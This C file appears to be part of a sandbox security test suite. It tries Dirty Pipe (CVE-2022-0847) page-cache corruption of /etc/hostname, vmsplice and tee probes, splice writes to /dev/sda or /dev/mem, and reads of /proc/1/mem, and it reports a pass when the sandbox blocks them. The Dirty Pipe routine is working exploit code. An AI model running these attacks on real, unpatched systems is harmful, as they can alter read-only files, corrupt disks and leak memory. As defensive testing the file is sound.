/*
 * test_02_dirty_pipe.c — splice() / Dirty-Pipe Style Page Cache Attack
 *
 * Attack vector: CVE-2022-0847 ("Dirty Pipe") exploited splice() to overwrite
 * read-only file data in the kernel page cache. Even though the file was
 * mounted read-only, writing to a pipe that shared the same page cache pages
 * allowed arbitrary file modification.
 *
 * We attempt:
 *   1. splice() from a read-only file into a pipe
 *   2. Write to the pipe hoping to corrupt the page cache
 *   3. Re-read the file to see if our write "took"
 *   4. vmsplice() to inject user-space pages into pipes
 *   5. tee() to duplicate pipe data without consuming it
 *
 * PASS = page cache not corrupted, splice restricted
 * FAIL = managed to modify read-only file contents
 */

#include "test_harness.h"

/* Target: /etc/hostname is read-only mounted. We try to corrupt it. */
#define TARGET_FILE "/etc/hostname"
#define MARKER "PWNED_BY_DIRTY_PIPE"

static int try_dirty_pipe_classic(void) {
    /* 1. Open the target file read-only */
    int target_fd = open(TARGET_FILE, O_RDONLY);
    if (target_fd < 0) return -1;  /* File doesn't exist = N/A */

    /* Read original content */
    char original[256] = {0};
    ssize_t orig_len = read(target_fd, original, sizeof(original) - 1);
    if (orig_len <= 0) { close(target_fd); return -1; }

    /* 2. Create a pipe */
    int pipefd[2];
    if (pipe(pipefd) < 0) { close(target_fd); return -1; }

    /* 3. Fill the pipe completely, then drain it.
     * This is the CVE-2022-0847 setup: the pipe pages get PIPE_BUF_FLAG_CAN_MERGE. */
    char junk[4096];
    memset(junk, 'A', sizeof(junk));

    /* Fill pipe (default pipe size is 65536 = 16 pages) */
    int flags = fcntl(pipefd[1], F_GETFL);
    fcntl(pipefd[1], F_SETFL, flags | O_NONBLOCK);
    while (write(pipefd[1], junk, sizeof(junk)) > 0);
    fcntl(pipefd[1], F_SETFL, flags);

    /* Drain pipe */
    fcntl(pipefd[0], F_SETFL, fcntl(pipefd[0], F_GETFL) | O_NONBLOCK);
    while (read(pipefd[0], junk, sizeof(junk)) > 0);
    fcntl(pipefd[0], F_SETFL, fcntl(pipefd[0], F_GETFL) & ~O_NONBLOCK);

    /* 4. splice() from target file into the pipe (1 byte to get the page) */
    lseek(target_fd, 0, SEEK_SET);
    ssize_t spliced = splice(target_fd, NULL, pipefd[1], NULL, 1, 0);

    /* 5. Write our payload — if CVE-2022-0847 is present, this overwrites
     *    the page cache at offset 1 of the target file. */
    if (spliced > 0) {
        write(pipefd[1], MARKER, strlen(MARKER));
    }

    /* 6. Re-read the file and check if it was corrupted */
    lseek(target_fd, 0, SEEK_SET);
    char after[256] = {0};
    read(target_fd, after, sizeof(after) - 1);

    close(pipefd[0]);
    close(pipefd[1]);
    close(target_fd);

    return strstr(after, MARKER) != NULL ? 1 : 0;
}

static int try_vmsplice_injection(void) {
    /* vmsplice() maps user pages into a pipe buffer.
     * If the kernel lets us vmsplice into a pipe that's connected to
     * a file splice, we could inject arbitrary data into the page cache. */
    int pipefd[2];
    if (pipe(pipefd) < 0) return -1;

    char payload[] = "INJECTED_VIA_VMSPLICE";
    struct iovec iov = {
        .iov_base = payload,
        .iov_len = sizeof(payload),
    };

    g_got_sigsys = 0;
    ssize_t ret = vmsplice(pipefd[1], &iov, 1, SPLICE_F_GIFT);

    close(pipefd[0]);
    close(pipefd[1]);

    if (g_got_sigsys) return -2;  /* Blocked by seccomp */
    return ret > 0 ? 0 : -1;     /* 0 = worked but no exploit, -1 = failed */
}

static int try_tee_pipe_duplication(void) {
    /* tee() duplicates pipe data without consuming it.
     * Could be used to fan out data to multiple destinations in a chain. */
    int pipe_a[2], pipe_b[2];
    if (pipe(pipe_a) < 0) return -1;
    if (pipe(pipe_b) < 0) { close(pipe_a[0]); close(pipe_a[1]); return -1; }

    write(pipe_a[1], "test", 4);

    g_got_sigsys = 0;
    ssize_t ret = tee(pipe_a[0], pipe_b[1], 4, 0);

    close(pipe_a[0]); close(pipe_a[1]);
    close(pipe_b[0]); close(pipe_b[1]);

    if (g_got_sigsys) return -2;
    return ret >= 0 ? 0 : -1;
}

static int try_splice_to_dev(void) {
    /* Try to splice from a pipe directly to /dev/sda or /dev/mem
     * This would allow writing to raw block devices. */
    int pipefd[2];
    if (pipe(pipefd) < 0) return -1;
    write(pipefd[1], "ESCAPE", 6);

    int dev_fd = open("/dev/sda", O_WRONLY);
    if (dev_fd < 0) dev_fd = open("/dev/mem", O_WRONLY);
    if (dev_fd < 0) {
        close(pipefd[0]); close(pipefd[1]);
        return -1;  /* Can't even open device */
    }

    ssize_t ret = splice(pipefd[0], NULL, dev_fd, NULL, 6, 0);
    close(dev_fd);
    close(pipefd[0]); close(pipefd[1]);
    return ret > 0 ? 1 : 0;
}

static int try_splice_proc_escape(void) {
    /* Try to splice from /proc/1/mem (host init) into a local file */
    int src = open("/proc/1/mem", O_RDONLY);
    if (src < 0) return -1;

    int pipefd[2];
    if (pipe(pipefd) < 0) { close(src); return -1; }

    off_t off = 0x400000;  /* Typical .text mapping */
    ssize_t ret = splice(src, &off, pipefd[1], NULL, 4096, 0);

    char buf[64] = {0};
    if (ret > 0) read(pipefd[0], buf, sizeof(buf));

    close(pipefd[0]); close(pipefd[1]);
    close(src);

    return ret > 0 ? 1 : 0;  /* Leaked host process memory! */
}

int main(void) {
    install_sigsys_handler();

    PRINT_HEADER("DIRTY PIPE / SPLICE PAGE CACHE ATTACKS");

    /* 1. Classic Dirty Pipe (CVE-2022-0847) */
    int dp = try_dirty_pipe_classic();
    TEST("CVE-2022-0847 Dirty Pipe blocked",
         dp != 1,
         dp == -1 ? "target not accessible (sandbox blocks it)" :
         dp == 1  ? "PAGE CACHE CORRUPTED!" : "splice limited");

    /* 2. vmsplice() page injection */
    int vs = try_vmsplice_injection();
    TEST("vmsplice() controlled or blocked",
         vs != 1,
         vs == -2 ? "blocked by seccomp (SIGSYS)" :
         vs == -1 ? "syscall failed (good)" : "available but no exploit path");

    /* 3. tee() pipe duplication */
    int te = try_tee_pipe_duplication();
    TEST("tee() controlled or blocked",
         te != 1,
         te == -2 ? "blocked by seccomp" :
         te == -1 ? "syscall failed" : "available but no exploit path");

    /* 4. splice to raw device */
    int sd = try_splice_to_dev();
    TEST("splice() to /dev/sda|mem blocked",
         sd != 1,
         sd == -1 ? "device open denied" :
         sd == 1  ? "WROTE TO RAW DEVICE!" : "splice denied");

    /* 5. splice from /proc/1/mem */
    int pm = try_splice_proc_escape();
    TEST("splice() from /proc/1/mem blocked",
         pm != 1,
         pm == -1 ? "/proc/1/mem open denied" :
         pm == 1  ? "LEAKED HOST PROCESS MEMORY!" : "splice denied");

    PRINT_SUMMARY();
    return g_fail > 0 ? 1 : 0;
}
